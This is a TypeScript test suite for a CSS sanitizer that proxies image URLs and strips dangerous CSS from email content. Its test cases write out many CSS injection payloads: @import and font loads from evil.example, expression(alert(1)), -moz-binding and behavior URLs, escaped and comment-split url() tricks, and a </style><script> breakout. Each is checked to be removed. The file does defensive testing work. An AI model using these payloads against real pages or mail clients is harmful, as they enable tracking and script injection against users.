import { parse, walk } from "css-tree";
import { describe, expect, it } from "vitest";
import { CSS_MAX_BYTES, rewriteCss, rewriteStyleAttribute } from "../src/index";
import { cssProblems } from "./oracle";

const PROXY = "https://view.example/img/";
const proxy = (u: string): string | null =>
  /^https?:\/\//i.test(u) ? `${PROXY}${Buffer.from(u).toString("base64url")}` : null;

function urls(css: string): string[] {
  const out: string[] = [];
  walk(parse(css), (n) => {
    if (n.type === "Url") out.push(n.value);
  });
  return out;
}

describe("rewriteCss", () => {
  it("routes every url() in every url-bearing property through the callback", () => {
    const css = `a{background:url(http://i.example/1.png);background-image:url("https://i.example/2.png");
      list-style:square url(https://i.example/3.png);cursor:url(https://i.example/4.cur),auto;
      border-image:url(https://i.example/5.png) 30 round;mask:url(https://i.example/6.svg#m);
      content:url(https://i.example/7.png);filter:url(https://i.example/8.svg#f);
      -webkit-mask-box-image:url(https://i.example/9.png)}`;
    const out = rewriteCss(css, proxy);
    const u = urls(out);
    expect(u).toHaveLength(9);
    expect(u.every((x) => x.startsWith(PROXY))).toBe(true);
    expect(cssProblems(out.replaceAll(PROXY, "https://view.example/img/"), "stylesheet")).toEqual(
      [],
    );
  });

  it("drops a declaration whose url the callback refuses, keeping the rest", () => {
    expect(rewriteCss("a{color:red;background:url(/relative.png);padding:1px}", proxy)).toBe(
      "a{color:red;padding:1px}",
    );
    expect(rewriteCss("a{background:url(//evil.example/x)}", proxy)).toBe("");
  });

  it("treats image-set() strings as URLs", () => {
    const out = rewriteCss(
      `a{background-image:image-set("https://i.example/a.png" 1x,url(https://i.example/b.png) 2x)}`,
      proxy,
    );
    expect(urls(out)).toHaveLength(2);
    expect(out).not.toContain("i.example");
    expect(rewriteCss(`a{background-image:-webkit-image-set("/rel.png" 1x)}`, proxy)).toBe("");
    const typed = rewriteCss(
      `a{background-image:image-set("https://i.example/a.avif" type("image/avif"))}`,
      proxy,
    );
    expect(typed).toContain('type("image/avif")');
  });

  it("neutralizes url() inside @media, @supports, @container, @layer, @keyframes and nesting", () => {
    const css = `@media screen{a{background:url(https://i.example/m.png)}}
      @supports (display:grid){b{background:url(https://i.example/s.png)}}
      @container card (min-width:400px){c{background:url(https://i.example/c.png)}}
      @layer base{d{background:url(https://i.example/l.png)}}
      @keyframes k{from{background:url(https://i.example/k.png)}}
      e{color:red;&:hover{background:url(https://i.example/n.png)}}`;
    const out = rewriteCss(css, proxy);
    expect(urls(out)).toHaveLength(6);
    expect(out).not.toContain("i.example");
    expect(
      rewriteCss("@supports (background:url(http://evil.example/x)){a{color:red}}", proxy),
    ).toBe("");
  });

  it("drops forbidden at-rules, including escaped and upper-case spellings", () => {
    for (const css of [
      "@import url(http://evil.example/x.css);",
      "@import 'http://evil.example/x.css';",
      "@IMPORT url(http://evil.example/x.css);",
      "@\\69mport url(http://evil.example/x.css);",
      "@font-face{font-family:x;src:url(http://evil.example/f.woff)}",
      "@namespace svg url(http://www.w3.org/2000/svg);",
      "@charset 'utf-8';",
      "@-moz-document url-prefix(){a{color:red}}",
      "@document url(http://evil.example/){a{color:red}}",
      "@property --x{syntax:'<url>';inherits:false;initial-value:url(http://evil.example/)}",
      "@view-transition{navigation:auto}",
      "@unknown{a{color:red}}",
    ]) {
      expect(rewriteCss(css, proxy), css).toBe("");
    }
  });

  it("drops dangerous properties and functions, including escaped names", () => {
    for (const decl of [
      "behavior:url(http://evil.example/x.htc)",
      "-ms-behavior:url(x.htc)",
      "-moz-binding:url(http://evil.example/x.xml#b)",
      "-moz-\\62 inding:url(http://evil.example/x.xml#b)",
      "-o-link:'javascript:alert(1)'",
      "-o-link-source:current",
      "-ms-filter:'progid:DXImageTransform.Microsoft.AlphaImageLoader(src=http://evil.example/)'",
      "width:expression(alert(1))",
      "width:EXPRESSION(alert(1))",
      "width:ex\\70 ression(alert(1))",
      "content:attr(title)",
      "background:image('http://evil.example/i.png')",
      "background:src('http://evil.example/i.png')",
      "background:element(#x)",
      "--x:url(http://evil.example/)",
      "background:var(--y, url(http://evil.example/fb))",
    ]) {
      expect(rewriteCss(`a{${decl}}`, proxy), decl).toBe("");
    }
  });

  it("defeats escape and comment tricks (css-tree decodes, Raw is dropped)", () => {
    for (const trick of [
      "a{background:u\\rl(http://evil.example/x)}",
      "a{background:\\75 rl(http://evil.example/x)}",
      "a{background:u\\72 l(http://evil.example/x)}",
      "a{background:U\\52 L(http://evil.example/x)}",
      "a{background:ur/**/l(http://evil.example/x)}",
      "a{background:url/**/(http://evil.example/x)}",
      "a{background:u\\0000rl(http://evil.example/x)}",
      "a{background:url(http://evil.example/x) \\75 rl(y)}",
    ]) {
      const out = rewriteCss(trick, proxy);
      expect(out, trick).not.toContain("evil.example");
      expect(cssProblems(out, "stylesheet"), trick).toEqual([]);
    }
  });

  it("can never close the <style> element or look like markup", () => {
    const out = rewriteCss(
      `a{content:"</style><script>alert(1)</script>"} b[title="<!--"]{color:red} @media (width<600px){c{color:red}}`,
      proxy,
    );
    expect(out).not.toMatch(/<[/!\w]/);
    expect(out).toContain("(width< 600px)");
    expect(rewriteCss("<!-- a{color:red} -->", proxy)).toBe("a{color:red}");
  });

  it("caps output at 64 KB on a rule boundary", () => {
    const css = Array.from({ length: 20_000 }, (_, i) => `.c${i}{color:red}`).join("");
    const out = rewriteCss(css, proxy);
    expect(Buffer.byteLength(out)).toBeLessThanOrEqual(CSS_MAX_BYTES);
    expect(out.endsWith("}")).toBe(true);
    expect(() =>
      parse(out, {
        onParseError: (e) => {
          throw e;
        },
      }),
    ).not.toThrow();
  });

  it("survives absurd nesting and garbage without throwing", () => {
    expect(rewriteCss("@media screen{".repeat(50_000) + "a{color:red}", proxy)).toBe("");
    expect(() => rewriteCss("}}}{{{;;;@@@\u0000￿".repeat(1000), proxy)).not.toThrow();
    expect(rewriteCss(undefined as unknown as string, proxy)).toBe("");
  });

  it("keeps normal email CSS intact", () => {
    const css = `@media only screen and (max-width:600px){.w{width:100%!important}}
      @media (prefers-color-scheme:dark){.b{color:#fff!important}}
      u + .body .x{a:b} .ExternalClass *{line-height:100%} #MessageViewBody a{color:inherit}
      a{-webkit-text-size-adjust:100%;mso-line-height-rule:exactly}
      div{background:linear-gradient(to right,#fff 0%,rgba(0,0,0,.5) 100%);font:12px/1.5 Arial,sans-serif}`;
    const out = rewriteCss(css, proxy);
    for (const frag of [
      "max-width:600px",
      "prefers-color-scheme:dark",
      ".ExternalClass",
      "mso-line-height-rule:exactly",
      "linear-gradient",
      "12px/1.5 Arial",
    ]) {
      expect(out).toContain(frag);
    }
  });
});

describe("rewriteCss: the image callback only sees urls that are emitted", () => {
  function spy() {
    const seen: string[] = [];
    return { seen, image: (u: string) => (seen.push(u), proxy(u)) };
  }

  it("not for a declaration a later node drops, nor for a sheet the paranoid scan drops", () => {
    const a = spy();
    expect(
      rewriteStyleAttribute("color:red;background:url(https://i.example/a.png) attr(x)", a.image),
    ).toBe("color:red");
    const b = spy();
    expect(
      rewriteCss(
        `b{background:url(https://i.example/b.png)} a{content:"\\6a avascript:"}`,
        b.image,
      ),
    ).toBe("");
    expect([...a.seen, ...b.seen]).toEqual([]);
  });

  it("not for rules past the 64 KB cap", () => {
    const filler = Array.from({ length: 3000 }, (_, i) => `.f${i}{color:red}`).join("");
    const tail = Array.from(
      { length: 50 },
      (_, i) => `.u${i}{background:url(https://i.example/${i}.png)}`,
    ).join("");
    for (const css of [filler + filler + tail, filler + tail + filler]) {
      const s = spy();
      const out = rewriteCss(css, s.image);
      expect(Buffer.byteLength(out)).toBeLessThanOrEqual(CSS_MAX_BYTES);
      expect(s.seen.length).toBe(urls(out).length);
    }
  });

  it("a forbidden token past the 64 KB cap does not drop the part that fits", () => {
    const filler = Array.from({ length: 6000 }, (_, i) => `.f${i}{color:red}`).join("");
    const out = rewriteCss(`${filler}a{content:"\\6a avascript:"}`, proxy);
    expect(out.startsWith(".f0{color:red}.f1{color:red}")).toBe(true);
    expect(Buffer.byteLength(out)).toBeLessThanOrEqual(CSS_MAX_BYTES);
    expect(out).not.toContain("content");
  });
});

describe("rewriteStyleAttribute", () => {
  it("rewrites a declaration list and cannot be broken out of", () => {
    expect(
      rewriteStyleAttribute("color:red; background:url(https://i.example/a.png) no-repeat", proxy),
    ).toMatch(
      /^color:red;background:url\(https:\/\/view\.example\/img\/[A-Za-z0-9_-]+\)no-repeat$/,
    );
    expect(
      rewriteStyleAttribute("color:red} body{background:url(http://evil.example/)", proxy),
    ).not.toContain("evil");
    expect(rewriteStyleAttribute("width:expression(alert(1));color:blue", proxy)).toBe(
      "color:blue",
    );
  });

  it("returns strings with DOMPurify's attribute probes unchanged (the sanitizer drops those)", () => {
    for (const probe of ["-->", "a]>b", "/>"]) {
      expect(rewriteStyleAttribute(`content:'${probe}';color:red`, proxy)).toBe(
        `content:"${probe}";color:red`,
      );
    }
  });
});
